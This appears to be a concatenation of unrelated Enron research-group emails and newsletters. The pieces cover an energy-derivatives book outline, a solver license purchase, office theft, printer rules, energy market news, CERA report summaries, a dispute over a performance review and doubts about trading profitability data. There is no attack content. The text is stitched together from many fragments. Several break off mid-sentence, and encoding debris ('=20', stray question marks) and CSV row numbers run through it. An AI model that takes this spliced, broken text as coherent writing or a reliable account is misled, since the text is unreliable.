forward  curves in energy markets; the arbitrage approach, the econometric=
=20
approach, and  deriving analytical values by modelling underlying stochasti=
c=20
factors.

?

Chapter 5 presents an overview of  structures found in the energy derivativ=
e=20
markets and discusses their uses.? Examples of products analysed in this =
=20
chapter include a variety of swaps, caps, floors and collars, as well as=20
energy  swaptions, compound options, Asian options, barrier options, lookba=
ck=20
options,  and ladder options.

?

Chapter 6 investigates single and  multi-factor models of the energy spot=
=20
price and the pricing of some standard  energy derivatives.? Closed form =
=20
solutions for forward prices, forward volatilities, and European option=20
prices  both on the spot and forwards are derived and presented for all the=
=20
models in  this chapter including a three factor, stochastic convenience=20
yield and interest  rate model.

?

Chapter 7 shows how the prices of  path dependent and American style option=
s=20
can be evaluated for the models in  Chapter 6.? Simulation schemes are =20
developed for the evaluation of European style options and applied to a=20
variety  of path dependent options.? In order  to price options which=20
incorporate early exercise opportunities, a trinomial  tree scheme is=20
developed.? This tree  is built to be consistent with the observed forward=
=20
curve and can be used to  price exotic as well as standard European and=20
American style options.

?

Chapter 8 describes a methodology  for valuing energy options based on=20
modelling the whole of the market observed  forward curve.? The approach=20
results  in a multi-factor model that is able to realistically capture the=
=20
evolution of a  wide range of energy forward curves.?  The user defined=20
volatility structures can be of an extremely general  form.? Closed-form=20
solutions are  developed for pricing standard European options, and efficie=
nt=20
Monte Carlo  schemes are presented for pricing exotic options.? The chapter=
=20
closes with a discussion of  the valuation of American style options.

?

Chapter 9 focuses on the risk  management of energy derivative positions.? =
=20
In this chapter we discuss the management of price risk for institutions =
=20
that trade options or other derivatives and who are then faced with the=20
problem  of managing the risk through time.?  We begin with delta hedging a=
=20
portfolio containing derivatives and look  at extensions to gamma hedging =
=01)=20
illustrating the techniques using both spot and  forward curve models.? The=
=20
general  model presented in Chapter 8 is ideally suited to multi-factor=20
hedging of a  portfolio of energy derivatives and this is also discussed.

?

Chapter 10 examines the key risk  management concept of Value at Risk (VaR)=
=20
applied to portfolios containing  energy derivative products.? After =20
discussing the concept of the measure, we look at how the key inputs =20
(volatilities, covariances, correlations, etc) can be estimated.? We then=
=20
compare the fours major  methodologies for computing VaR; Delta, Delta-gamm=
a,=20
historical simulation and  Monte-Carlo simulation, applying each to the sam=
e=20
portfolio of energy  options.? In this chapter we also  look at testing the=
=20
VaR estimates for various underlying energy market  variables.

?

Finally, in Chapter 11 we review  modelling approaches to credit risk.?  We=
=20
look in detail at two quite different approaches, CreditMetrics (J. P. Morg=
an=20
(1997)) and  CreditRisk+ (Credit Suisse Financial  Products (1997)) for whi=
ch=20
detailed information is publicly available.? Together these provide an=20
extensive set  of tools with which to measure credit risk.? We present=20
numerical examples of  applying these techniques to energy derivatives.

?
Before  we begin we stress that the models and methods we present in this=
=20
book are tools  which should be used with the benefit of an understanding o=

Therefore,  just for the summer we need to use Jose's and Joe's offices

I'd like to purchase some copies of the XPRESS LP solver for the gas storage 
optimization model.  We have previously discussed the purchase of CPLEX, but 
after trialing both systems, have found some worthwhile advantages with 
XPRESS.  If others find Planner / CPLEX best suited to their application, I 
see no problem is their use of a different system - both have strengths, and 
it is likely that I would use Planner/CPLEX myself on some future project if 
we were to have both systems available.

XPRESS is particularly suited to my application because it handles Special 
Ordered Sets.  This is a very efficient way of representing the storage 
ratchets as the integer search process is able to use the extra information 
provided by the set, rather than just using binary integer variables to 
represent the ratchets.

Planner is a C++ interface for CPLEX.  It has some significant limitations, 
and does not permit access to all CPLEX features.

Dash Optimization have made the following offer:
All software purchases made by Enron this year will be at 30% off the list 
price - we do not need to make a single purchase of any specific quantity of 
licenses to obtain this discount.
90 days of full maintenance services will be provided with the purchase.
The EMOSL utility will be provided at no cost.
The XBSL system will be provided at no cost when it is released in a few 
weeks time.

For the Gas Storage Optimization model, I would like to purchase:
One development license, hyper version, with modeller, primal/dual simplex, 
MIP search, dlls, EMOSL and XBSL when available.
 List price $10,000  Discounted price  $7,000
Two run time licenses for above,
 List price total $8,000    Discounted price  $5,600
     Total cost  $12,600

I've used the usually security request system to set the purchase process 
going, should you agree to this.

Having been out of the office for a couple of days, I've found myself the 
victim of theft (again).  This time my desk drawer key has been stolen from 
its ""hiding place"" under my telephone.  I *always* lock my drawers and keep 
the key in the same place, but on arriving in the office today I found the 
drawers unlocked, and the key missing.  Although there's nothing sensitive on 
or around my desk, I'm concerned about the security implications of someone 
sniffing around the office in this manner.  I also found the papers on my 
desk extensively reshuffled last week.

Last year, in our old office, I had my only two real options books stolen 
from among the many and varied books on my desk.  That couldn't have been a 
random theft, and I fear this isn't either.  I can't understand who'd be so 
interested in a Research guy's belongings!

Can we ask security to check their surveillance footage for any suspicious

FYI.

Prof. Gabriel Bitran of the M.I.T. management science department is planning 
to visit EBS on Wednesday, Aug. 9, to discuss research topics which might be 
of interest to EBS.   (This is Amit Dhadwal's advisor.)   He still has 25K of 
funding to use for research, but we are having a hard time coming up with a 
mutually suitable topic.   I have asked Samer to work with him in trying to 
come up with a research subject.

ongoing initiative on best practices and strategies in high technology 
acquisitions.? This is part of our research activity and there is no 
conference fee.


Our December 5 event will be of special value to senior decision makers 
involved in planning or implementing growth through mergers and 
acquisitions.? In case you are unable to attend or would like to include

About The High Tech Acquisitions Research Project
A Research Collaboration of the Wharton School & Insead


The High Technology Acquisitions Research Project, jointly organized by The 
Wharton School and INSEAD, has been conducting research to identify the 
determinants of success in high technology acquisitions.?


Our research includes developing a portfolio of in-depth case studies, 
building a unique acquisitions database, and hosting semi-annual workshops 
for industry practitioners.? These tools allow? us to perform rigorous 
analysis to determine success factors in high technology mergers and 
acquisitions.? Firms that have participated in our research process so far 
include Cisco, Cable & Wireless, Hewlett Packard, Lucent, Symantec, and Xerox.


Timely Insights for Company Decision-Makers.? One of the most unique aspects 
of this project is the reporting of research in progress, to give industry 
decision makers access to the insights from our research as they are 
revealed.? To test and refine our findings, we host an ongoing series of 
workshops that bring together practitioners from some of the most experienced 
acquirers in the high tech arena, and academicians whose research interests 
converge on the role of acquisitions in technology-based competition.


Our next workshop on December 5 will be the third in the series.? Prior 
events were held in December 1999 at Wharton and June 2000 at INSEAD in 
Paris, France. (Reports of these events are available on the ET website: 
http://emertech.wharton.upenn.edu).


Objectives.? Our objective is to build a community of practice around the 
complex phenomenon of managing acquisitions in high-tech environments.? A 
major goal is to identify and validate new best practices and winning 
strategies in mergers and acquisitions.? Most of our focus involves issues of 
value and concern to large multinational corporations.? We are particularly 
interested in how mergers and acquisitions are pursued as part of a company's 
GROWTH STRATEGY.


Research Team.? The research team on this initiative includes:? Prof. Harbir 
Singh, Chairmsn of the Management Department and Co-Director, Mack Center for 
Technological Innovation (Wharton); Phanish Puranam, Project Director and 
Ph.D. Candidate (Wharton); and Mauricio Zollo, Asst. Prof. of Management

This memo only applies to the Research group on the 19th floor that use
the colored printer ""Taj Mahal"".

Vince has requested that I ask each of you to only use the colored printer
""Taj Mahal"" for presentations, newsletters, etc. that require at least 90% 
of color.  These cartridges are very expensive and several times we have
picked up a copy of something that only had color on the first page and it
would be maybe 15-20 pages long.  This is not cost effective.

If you have something that has color on the first page, but not on the rest
of the presentation, then please just print the first page on the color 
printer
and the rest on ""Bandit"" or ""Wagon"".

Your help will be greatly appreciated!

Please find attached file with average monthly prices for regions your 
requested. This file gives more information than the previous (yesterday) 
one. As the one before, source for this file is Megawatt daily, it includes 
On-Peak and Off-Peak prices and you can also see daily data that was 
converted to monthly average data. There are two types of averages prices: 
average and weighted average. Weighted average takes into account number of 
transactions of certain price.

For example: PJM had average price of $53.61 and weighted average price of 
$53.15 in August , it means that there were more transactions of lower price 
than higher.  Also, Megawatt Daily has its own methodology and I am attaching 
it with this message.

Thanks for your response.  Apparently, we were under the incorrect impression 
that your group would be taking Li (based on Jeff's note below).  We 
apologize for not contacting you last Friday to confirm prior to ""placing"" Li 
in your group.  I have faxed Li's resume to you and hope that you will have

If Vince is not interested in Li for his group, we will consider Li placed in

I hear from Vince one way or the other, the program will consider Li's 
placement final in either Research or ENA - Gas Trading.  Hopefully this will

Northwest Spot Power Prices Rise

   Spot power prices in the Pacific Northwest continued higher
yesterday amid unit outages and strong natural gas prices. A
projected weekend outage at the 1,087 MW Diablo Canyon Unit 2 nuclear
power plant and a 10-day outage at the 820 MW IPP Unit 1 coal power
plant should keep supplies scarce heading into next week. At COB,
power for today rose over $15 to $270. Power sold at Mid-Columbia for
today was up $15 at $267. Concern is mounting about the possibility
of a dry year in the Pacific Northwest, which could keep prices high
into the spring. In the Southwest, power prices declined amid lower
day-ahead demand. According to the California PX, demand  will peak
at 32,435 MW today. Palo Verde slipped $36 to $137 per MWh, while
Mead traded down $32 at $146 per MWh.

Alliance Begins Commercial Operations

    Alliance pipeline is finally ready to begin commercial shipment
of Canadian natural gas to Chicago from northern British Columbia
today and operators are already talking about expanding the system.
Originally scheduled to begin flowing in October, the delayed opening
is set for the pipeline to begin transporting today. The addition of
the $3 billion Alliance pipeline's capacity curbed price increases at
Chicago yesterday relative to spikes in the Northeast. Cold weather
headed for the East Coast triggered a 9% price jump in the region's
prices yesterday.
Prices at the New York City gate surged $0.75 per MMBtu to a record
high of $7.20, while Chicago prices were only Up $0.35 at $6.41 per
MMBtu. Canada supplies about 16% of US natural gas. Alliance is one
of two new pipelines beginning operations this week. BC Gas C$375
million Southern Crossing Pipeline from eastern British Columbia to
the West Coast began pumping 250 MMcf per day on Thursday in
competition with Westcoast Energy. For its part, the Alliance system
is seen by some as a key link in the eventual transport of Arctic
natural gas to market. BP Amoco has assumed the transportation
responsibilities of eight shippers on the pipeline whose volumes
total more than 250 MMcf per day, and plans to increase that amount.
Alliance partners include Westcoast Energy, 23.6%; Enbridge, 21.4%;
Fort Chicago Energy Partners, 26%; Williams, 14.6%; and Coastal,
14.4%.

We will be adding Southern Crossing to the next base case.

Also, some corrections are needed in our Alliance model.  Further research
shows that the maximum receipt capacity from B.C. to be about 300 / day
(9,120 / month) and from A.B. to be 1,950 / day (59,280).  Alliance
receives no supplies in the Northwest Territories and has no plans for
doing so.  The only existing connection to NWT is into Westcoast.  I would
change its capacity to 400 / day (12,160 / month), increasing to 500 / day
(15,200) in 2002.  Nova (TCPL Alberta System) is considering an extension
into NWT in the future.  The current base case shows a need for more than
500 / day starting in 2006.  So, I've set up a supply link from NWT into
Nova at 300 / day starting in 2006.


Pollution Credits Shutting Down California Power Plants

    AES says output from three of its power plants in southern
California has been cut in half due to a shortage of pollution
credits. AES Pacific has curtailed 2,000 MW of a total capacity of
4,000 MW at its three natural-gas fired plants in the Los Angeles
area, Alamitos, Huntington Beach and Redondo Beach. The move followed
the filing of a petition by the South Coast Air Quality Management
District related to its Alamitos plant which had exceeded its NOX
emission allocation. Both Huntington Beach and Redondo Beach were
close to reaching their NOX allocations. The plants could operate if
the California ISO declared a power emergency.  An arbitration board
is due to rule in late December on the air quality district's
petition. California has been struggling to meet surging demand for
power this year. There have also been few power plants built during
the last decade and the California ISO has had to issue numerous
power alerts this year as operating reserves dropped to critical
levels. The California ISO says a number of other plants are also
running out of pollution credits.

Coastal to Buy Pipe for Gulfstream

     Coastal has agreed to buy steel pipe for the Gulfstream natural
gas pipeline from Berg Steel Pipe Corp for $310 million. Coastal's
774-mile pipeline will run from Mobile, AL across the Gulf of Mexico
to Tampa. Duke and Williams, which had been developing a competing
project, agreed earlier this month to buy Coastal's pipeline. Terms
were not disclosed. Coastal's purchase was for the 36-inch diameter
pipeline to run through the Gulf of Mexico and the 36-inch and 30-
inch pipe for Florida. Pipe production will start immediately with
delivery starting early next year in Port Manatee, Florida, and
Mobile. All of the pipe is scheduled for delivery by September, and
the pipeline is scheduled to start by June 2002. Coastal plans to
complete the sale of the Gulfstream system this quarter.

According to Williams' Buccaneer website, upon closure of the purchase of
Gulfstream by Williams - Duke, Gulfstream will be built in lieu of
Buccaneer.  Our next base case database will reflect this change.

Power Marketers Accused of Manipulating Prices

    Enron, PG&E Energy Trading, Duke Energy Trading and Marketing,
Sempra Energy Trading and Dynegy Power Marketing are among a dozen
energy companies accused in a lawsuit of conspiring to manipulate
California wholesale electricity prices.  The lawsuit claims
companies selling electricity in California intentionally limited
supply to drive up prices. The suit seeks certification as a class
action covering all electricity consumers in California, estimates
damages in excess of $1 billion. The allegations in the lawsuit are
based on a number of studies of the state's electricity market that
concluded it was not functioning normally. Southern California Edison
and PG&E's Pacific Gas & Electric filed suit against state officials
separately last month for permission to charge customers billions of
dollars for losses from open-market power purchases.

Thank you for your message. I shall be glad to make a presentation at
Carnegie Mellon. I am discussing with Pierre Ste-Marie possible dates and it
seems at this point that November the 3rd would be the most convenient day.

November the 10th is an alternative date, but I need a few more days to make
a commitment.

2846,"Hi Shirley, please give me a few dates form end of march to first week in 
April to do an offsite for Vince's direct reports (including myself) and 
selected EBS research people. This includes, Vince direct report from our 
research group and the following people from EBS Research:

Ravi, Stinson, Samer, Chinowee.

The agenda will include: Research people giving several mini presentations on 
Trading, market development (history of Nat gas, Electricity, etc.), pricing, 
etc...

John's people will do similar mini presentations on Optical Network 
engineering, optical components, provisioning, telecom markets, pricing, 
etc.... 
If Scott Yeager can make it, he will do his magic via quick motivational 
speech on the vision of EBS, etc..

It is will be strictly Technical to Technical professional meeting to get to 
know each others group. So, do not include others unles Stinson or I look at 
the additions case-by-case.

John suggested Scott Yeager's summar house in Denver for this event.  Please 
follow this up with Scott's assistant (Scott may not know about this if John 
has not told him so you should explain the intend, etc.) to get in touch with 
Scott.  I'll cc this e-mail to give Scott a heads up.

We can do half day friday and all day saturday. Or, we can do the whole 
weekend and people will have an option to bring family to nearby hotel 
(family expense in NOT on EBS). We will have to sort all this out when we 
have a chance to talk to John & Scott.

I just wanted to get the ball rolling but getting dates and place first.

have more of a strategic relationship in mine (Enron / Stanford) and he 
agreed to that as well.  Tom mentioned that Greg Whalley was interested in 
estabilishing such a relationship.  Vince, could you follow this up and 
ground this? If you need any help in doing the leg work, I'll happy to do 
that.

bandwidth trading. He seems very interested in being our sponsor on the EBS 
side. That would be very beneficial to us since he is involved in all senior

try to setup a meeting with Kevin Hannon and Tom to discuss this further.

think of structured products with better margins that Blend & Extend that 
they are selling. He wanted to know now much more resource that we need in

2865,"Hi Stinson, as per our discussion, which we will expand upon when we meet 
later today, my currently role in Hamachi is better characterize as 
combination of deal support (from the engineering perpsective), facilitating 
my work with Jean Mrha (via Erik Simpson) on the initial load forecast and 
general requirements document development.  None of this is technical by any 
means.  If anything, it is more like engineering consulting (from deal 
perspective) by EBS Research to John's group.  I will bring it up with John 
tomorrow night about bringing our technical guys on such road trips so that 
they can get involved with his group even though no optimization modeling 
work may need to be done. For this I will use Samer and/or Chonawee but we 
need to be certain that they are available on such on-call basis as stated 
below.  John is very clear and specific about who he ask to be at such 
meeting and when, etc.  Normally he does not want any deviations. So if we 
put someone on such jobs, they have to be able to travel on-call anywhere, 
any place. That is the time pressure he is working with.   

He want me to be the primary contact for such deal support effort. But I will 
ask to bring along our technical guys on such trips so that they are plugged 
in etc...
I will recommend this to John for the next deal that he is planning.

Note that the person mentioned in the text below (Ming Lung Lee) is very 
experienced in traditional traffic engineering work. He comes from MCI where 
he was responsible for modeling traffic etc.  It  appears that Sycamore 
finally got him.  One time they had lost him to Corvis (another optical 
equipment company), I guess Sycamore went back to him with a better deal!  As 
soon as this guy is available, I'll set up an all day technical meeting to 
hash out what needs to be done as far as optimization algorithm development 
is concerned.  I want to produce a technical requirement document to clearly 
outline what needs to be done to support dynamic, optical-switched-circuits 
based trading and streaming media applications, etc.  Having such an industry 
expert help us will help 'justify' internally all the the effort on the 
traffic analysis side that John Griebling has asked us to support.  Keep in 
mind that even though he is an expert in the field, the field that we need to 
play in has not develop yet. Even the emerging data based traffic (as opposed 
to voice where blocking of traffic is allowed) analysis is an order of 
magnitude more difficult (due to uncertain load), let alone trading such load 
(which we are planning to do!).

design/planning piece of the business.  He will be contracted out to Enron
for a period of 6 months initially.  He lives in SF but will be traveling to

between you guys for Wednesday morning, if you have time.  His name is Ming

The Henwood runs for Dabhol are, at least temporarily, over.  However, the 
main modeller for Henwood (David Yumigada) works out of their California 
office.

It maybe worth our while to have him come and demonstrate the runs, and 
explain the modelling algorithm to the larger group.

In aparticular, now that I am going through some of the comments people have 
raised on the PSIM model, I think there is value in understanding the way 
Henwood deals with Hot and Cold Starts, ramp up costs, and with issues of 
cycling plants.

I think understanding these will help in developing the next version of the 
PSIM, and will also give the group here ideas to build into existing models.  
This is a suggestion, and so please let me know if you see value in this.

Sarah,

As I have not yet heard from Jayshree, I thought I would convey the gist of our phone conversation by e-mail.  

Over the last several days, we in the research group have looked at ORACLE risk management databases and Enrononline data to corroborate the profitability numbers for power and gas trading.  Our analyses yield figures which are substantially at variance with what is normally believed to be the case.  Of course, there may well be information sources we are not privy to.  Moreover, we found some irregularities in the data which only serve to raise our doubts about the quality of the data.

As a result, we are not able to make an authoritative statement about the profitability of power and gas units. As we are not able to intepret the data ourselves, we have provided the spreadsheets so you can draw your own conclusions.  Thanks.

It  was Saturday morning at 5:30AM when I arrived at Tully Stadium, the sta=

o our 100-mile journey for the day.  This year there was a lot of press  co=
verage as the ride was dedicated to Maxine Mesinger.  Maxine, a long time s=

The  cannon went off and I kicked into high gear.  I flew with the fastest =

 to maintain a speed of 22  miles an hour, crossing the Katy prairie while =
the race teams that started  behind us were passing me.  My first  stop was=
 break point three, 39 miles into the ride, and 1 hour and 45 minutes  late=

I  headed over to the Enron tent, the largest tent in La Grange.  After che=

the food was even better.  While in the tent I was talking to some  other E=

The  next morning at 4:45AM, it was time to get up.  Ilene and I arrived at=

The first 20 miles  were relatively uneventful except I was able to carry o=

 downhill where you can reach speeds over 40 mph without  trying, the park =
is now only 3 miles away.   The park has a very hilly, curvy, and dangerous=
 route lasting 10  miles.  I stopped right inside the  park to refill water=
 and get some snacks.   I was really glad that I had the new bike with the =
triple, as I was able  to get up hills with little effort while others were=
 struggling or walking their  bikes.  That was until killer hill,  which I =
did not remember being too difficult.  After the downhill there was the  up=

I have reduced the amount of data somewhat by using the following limitations: WTI Crude Oil swap transactions only, starting from January 1, 2001, with delivery in the USA. This allowed me to get rid of some unnecessary fields.

Today's focus: How much is too much?

By Jeb Bolding

In October I talked about Relera, which at that time, announced
that it was getting out of the managed-services business.
Before it made the announcement I visited its Internet data
center in Denver and what comes to my mind when I think about
the discussion I had with its CEO, and my impression of the
facilities is one word: scale.

Everything was about having the best partners, the biggest data
center, massive systems redundancy rates, etc. No doubt, there
is a place for that corporate mentality, and Relera's focus on
scale should be a comfort to many enterprise companies. Relera
may have just been unfortunate with its timing in the market
and it may yet be successful with its focus.

As a counterpoint, yesterday I visited another local Internet
data center provider, Inflow. Like Relera, Inflow is
headquartered in Denver, and like Relera, it is focused at
second-tier cities such as Nashville and Minneapolis, though it
does have some first-tier city locations.

The similarities, in my opinion, end there. Inflow's corporate
esprit de corps seems to revolve around ""smaller is better.""

As an example, the data centers are smaller, somewhere between
20,000 and 30,000 square feet. Not only does this bring data
center profitability sooner based upon allocated space, but it
also gives, in the words of Inflow executives, a more personal
touch to the relationship between the data-center managers and
Inflow's customers.

Further to this point, instead of effectively building its own
substations, Inflow ensures that each of its data centers
(there are three in Denver) are located on different power
grids. While this may not put you in complete control over your
own destiny, it's a reasonable, and cost-efficient solution
based upon the statistical likelihood of a disaster.

While Inflow's costs are considerably less, the features of its
facilities do not appear to be diminished.

All data centers are mirror images of one another (other than
the square footage), so that a customer walking into a
Nashville facility will be just as at home in a Denver center.

All the services, from simple co-location, to managed security
services and monitoring, are replicated similarly across the
various locations.

And your single operational account representative is your
focal service point regardless of how many Inflow data centers
you're in. Management is fully integrated between the data
centers so that your customer representative does not have to
be local to your issues in order to solve them.

No doubt, there is a place in the business world for Relera and
Inflow. Inflow may have just lucked out that its focus on costs
will help the company better weather a long downturn.

2917,"Vince, 

I would like to respond to the discussion that we had today.  It probably would have been more accurate to characterize my work for Ken Lay as a ""briefing"" rather than as a ""speech"".  When I said I wrote a speech, I meant ""I prepared presentation material"" for him to use for his speaking engagement.  I thought that ""writing a speech"" and ""preparing a presentation"" is OK to use interchangeably in the English language. 

In my review I stated as an accomplishment, "" I worked with the Chairman of Enron, Ken Lay, briefing him on President Bush's tax proposals helping him prepare for a trip to the White House along with Steve Kean.""   However, I think the results are the same.  Ken Lay and Steve Kean were pleased with our contribution.  To me this was an accomplishment not only for me, but our group, and I would hope The Reseach Department.  

For you to say that my misuse of the English language ""undermines my credibility"", however, is a bit strong and I do not agree.  I pride myself in is my honesty.

Title: LNG in the Mediterranean: The Search for Additional Markets
URL(s):

http://www.cera.com/eprofile?u=35&m=2960;


***********************************************************************

THE REVIVAL OF LNG IN THE MEDITERRANEAN

Recent developments confirm the revival of LNG in the Mediterranean. Will this
pace of activity be maintained? A brief assessment of key markets suggests that
there is a risk they will be oversupplied in the medium and longer-term. LNG
producers may need to look to alternative markets for the next generation of
supply contracts.

*  A rash of LNG contracts is fast filling up the Iberian market.

*  Pipeline supplies have cornered the bulk of the Turkish market.

*  LNG developers may now target the Italian market, although the obstacles for
LNG in Italy remain significant.

2920,"Dear Vince:

I hope you have liked the short paper on decision making I sent you a week ago.  It emphasizes the human nature of the process of decision making.  I personally believe that this line of reasoning is systematically neglected by the investment and trading communities.  I think that many of the great traders and investors are very well aware of these limitations of human mind and are making efforts to utilize them.  For example you may encounter similar ideas in the George Soros' book ""The Alchemy of Finance"".  I am certain that developing and expertise in this area bears a tremendous potential for improving  Enron's trading operations and will give us an edge with respect  to other trading powerhouses. 

Do you think there are desks at Enron that may be interested in developing a system of procedures that leads to improving our trading performance?  I will be extremely interested in working in this field.  By the way I have already gathered many of  the basic pieces of information needed for such an undertaking.

As a beginning I may make an overview of the literature available on decision biases and list as many of them as possible.  Indeed, the mind traps mentioned in the paper are not the only ones.  Later we may discuss with our clients possibilities for quantifying the influence of a selected group of these biases on the performance of our traders.  Still later, a set of questionnaries, a system for keeping trader's perceptions prior to every act of decion making, and the result of the decision will be created, etc.  

I envision the final product to be a self-educating trading system learning from every single experience, both positive and negative and utilizing the history of the decision maker to her best benefit.  After some transition period, the result should be a more enlightened process of decision making of our traders, stripped as much as possible from the common psychological biases and utilizing human judgment--the very thing which differentiates the good trader from the computer (or the bad trader, for that matter).

I will highly appreciate your opinion on these issues.

Thank you in advance.

Sincerely yours,

BUSINESS HIGHLIGHTS

eSource
eSource, Enron's research group, has experienced an overwhelmingly positive response to the research training which it has hosted.  Participation and interest by Enron employees has exceeded expectations and many classes were quickly filled.  As a result, repeat classes have been offered and new sessions have been added to the program.  In addition to the Lexis-Nexis and Dow Jones classes, eSource has now begun hosting sessions on Piranha (financials and pricing information), Investext (analyst reports and market analysis), Global Access (financials and corporate activity), and Securities Data Corp. (M&A, debt).   eSource has also arranged long distance sessions using interactive web tools for Enron employees around the world.  Watch for e-mails announcing new training sessions, either in Houston or in a virtual desktop mode.

Since our launch in December, the eSearch website has received over 230,000 hits.  The site today offers Enron employees access to 34 electronic databases.  These databases offer the latest financial and business on-line research capabilities in a cost-effective manner.  In this era of information explosion, databases are constantly being reviewed to ensure that Enron's research needs are being met.  If you know of a professionally relevant database that might be added to eSearch, let us know.  Meanwhile, to further fulfill Enron's research needs, eSource is arranging for desktop access to good-old-fashioned libraries too.  Books from public and local university libraries can be located, borrowed and delivered to employees' desks.  This should be particularly helpful for those with more specialized or technical research needs. 

We are also proud to report that at a recent local research conference, Enron's eSource was featured as an industry trailblazer for having invented itself into a combined virtual library and intranet-based research center capable of delivering a broad range of research products and services via the user's desktop.  Attendees from Reliant, Shell, Halliburton and ExxonMobil and others were duly impressed.  

As for the future, watch for Version 2.0 of the eSearch website, http://esource.enron.com, scheduled to launch soon.  It will feature greater functionality and additional content.  Look for new features like ""Industry Overviews"" and links to information providers like Frost & Sullivan, Country Watch, and World Energy Markets.


IN THE NEWS

Chicago And Its Suburbs Pick Enron, ComEd For Power Deals
06/06/2001  Dow Jones Energy Service (Copyright (c) 2001, Dow Jones & Company, Inc.)
CHICAGO -(Dow Jones)-The City of Chicago and 47 suburban communities have decided to divide new deals for 400 megawatts of power between Enron Corp. (ENE) and local utility Commonwealth Edison Co., Chicago officials said Wednesday. 
In the largest power purchase agreement in Illinois since the state choose to deregulate the industry in 1997, the local government groups will get 60% of their power from Enron and 40% from Exelon Corp.'s (EXC) ComEd. The municipalities use the power for public buildings and public transportation.
Chicago announced Monday that the group has picked ComEd to meet the renewable target by providing 80 megawatts of power created with landfill gas, wind and other sources. ComEd will also provide the coalition with another 80 megawatts of power generated with fossil fuel and nuclear plants, and Enron will provide the other 240 megawatts. The new contracts are expected to go into effect this year. 
""We used our purchasing power as local governments to get the best price we could and at the same time to promote competition in Illinois. Enron gave us the most competitive price,""  Chicago Mayor Richard M. Daley said at a press conference.

WEEKLY REVIEW
http://email.eRisks.com/cgi-bin10/flo?y=eIfr0BHCKe0CjE0ImL0Av
In this week&#8217;s economic, banking and P&C insurance news from an enterprise risk management perspective: corporate profits take their worst hit for a decade; tobacco firms face new legal risks; investment banks feel the effects of the deal drought; the SEC comes under fire; and catastrophe risk for insurers may be falling.

ANALYSIS

to Basle II.

VIEWPOINT
http://email.eRisks.com/cgi-bin10/flo?y=eIfr0BHCKe0CjE0B4X0A4
As chief risk officer, Walter Smiechewicz was charged with developing an
enterprise risk management framework at Old Kent, a relatively unusual
undertaking for such a small firm. The bank&#8217;s recent merger with fellow
regional Fifth Third put an end to the programme, but as Smiechewicz tells
ERisk's Duncan Wood in our latest Q&A, it learnt a lot of valuable lessons
along the way.

JOB LISTINGS

Next week we're planning on recalibrating the dummified regression models (""placement models"") built earlier this year and last for the Enron Credit pricing system. These basically have the objective of predicting a 5-yr CDS price for an illiquid name, based on available data. This data consists of:
Credit Ratings, Outlook and Watch
Equity based data - eg, EDF, 90d Volatility, Beta, Market Cap, Dividend yield, PE ratio
Financial ratios - eg, EBITDA interest coverage, Current ratio, EPS, Debt to Assets
Descriptive Info - Country and Industry

I've outlined the methodology used for the models thus far in the attached docs:

2935,"Dear Faculty,

On Jan. 31, the new web-based faculty reporting system -- developed to
provide a mechanism for faculty members to file electronic annual reports to
the Dean while also updating their Jones School web pages -- will be
launched. This system will allow you and/or your staff assistants to 1) file
annual report to the Dean; 2) maintain individual faculty web pages; 3)
output entries into downloadable Rich Text Format, so that entries into the
system can be used to update CV's.

Although the system is designed for ease of use, you are invited to join
staff at the training session from 2:15 to 3:45 p.m., on Thursday, Jan. 31
in Rm. 101. Staff assistants will be trained to use the system in order to
provide you with assistance if you need it. The session will provide a
walkthrough about how to use the system, make, change, and save entries for
the annual report to the Dean.

Attached is a detailed user's manual in MS Word and Acrobat PDF for your
records. On Jan. 31, we will send you another e-mail with the site admin web
address and instructions to log in so that you may begin using the system.

2936,"Hi Vince

Here's a rough draft for your perusal and comments.  I can be reached at
(517) 423 5617.


We at ICAST have had a meeting to explore the two problems we discussed with
you and Vasant over the phone last week, and we have decided we feel
confident we can find optimum solutions to these problems given the
necessary support.

Outlined below is the approach we have used for solving difficult pattern
recognition problems in the past for Eli Lilly and GM.  If Enron is
interested in this approach, we would be happy to submit a proposal to Enron
to take on this project for one or both of the problems you described.

Task 1.  Our company will analyze the data sets available from Enron for one
week at our own expense.  The purpose of this analysis is to estimate the
cost (amount of time and the skill set needed) to develop proof-of-concept
prototype software.

Task 2.  ICAST will then demonstrate the POC software to the Enron
scientists at the Enron facilities using the training set(s) and one or more
new data sets.

Task 3.  Given successful demonstrations of the POC solution(s), ICAST and
Enron will meet to discuss the efficacy of the approaches used and will
determine jointly the specifications of planned production software, and the
method of providing this capability to Enron for routine every day use.

Task 4.  ICAST will submit proposals for developing the production versions
of the softare that will meet the agreed upon specifications.


The cost of developing the proof-of-concept software, and the labor needed
to demonstrate it to Enron is estimated to be $150K (plus out-of-pocket
expenses) for each of the problems, and, it is estimated at this time that

Title: Viewing Environmental Strategy Issues in a New Light

http://www20.cera.com/eprofile?u=35&m=2758;


***********************************************************************

STRATEGIC CHALLENGES GROW IN ENVIRONMENTAL ARENA

The issues that are most prominent in the environmental arena are notable for
their relatively long time horizons. Thus, although the uncertainty created by
recent events might cause adjustments in environmental strategies it is less
likely to result in fundamental shifts in direction. In the immediate future,
however, the challenge will be in responding to a shifting landscape while
maintaining long-term objectives.

* Parties to the Kyoto Protocol are forging ahead with final negotiations,
while the US focus is on when a domestic climate change policy might appear.

* The European Union is moving toward development of a unified greenhouse gas
emissions trading scheme, while individual European nations are developing or
implementing their own (potentially incompatible) systems.

* Continued technology maturation combined with heightened energy security
concerns is solidifying the foundation of the renewable energy niche, bringing
increased focus on remaining technical and political hurdles.

Title: Quarterly Natural Gas Watch: A Shortage of Demand
URL(s):

http://www20.cera.com/eprofile?u=35&m=2789;


***********************************************************************

NO HELP FROM DEMAND: DIFFICULT TIME IN THE NORTH AMERICAN GAS MARKET

Since January, natural gas prices have fluctuated between $2.00 per MMBtu at
the Henry Hub and $10.00, a result of weather, fuel switching, and increasing
supplies. Loss of demand due to economic weakness is exacerbated by the impact
of the tragedy of September 11. Lower prices have already slowed drilling
activity. Although ample storage levels will guard against last year's peaks,
gas prices will likely to continue to oscillate in the near term.

* The US gas supply rebound expected after record drilling rates is now
unlikely. CERA expects only modest production increases for 2001 and a year-
over-year decline for 2002.

* CERA has analyzed two paths for demand recovery depending on the severity and
length of the economic downturn. Generally, the large overbuild of gas-fired
generating plants and the recovery of industrial demand should cause much of
the lost demand to return in 2002.

just wanted to summarize for you how I see the issues related to Credit Reserve and Var models:

Credit Reserve:
In order to address RAC's requests and questions related to this model Research needs to be able to
compile and run the code. These procedures are not straight forward. Compilation and running can be done by 
using some scripts prepared by IT. Runs by different users can interfere with each other and with production runs.
All this involves knowledge of Java, Corba, multi-threading, etc. and our IT's specific implementations, files locations....
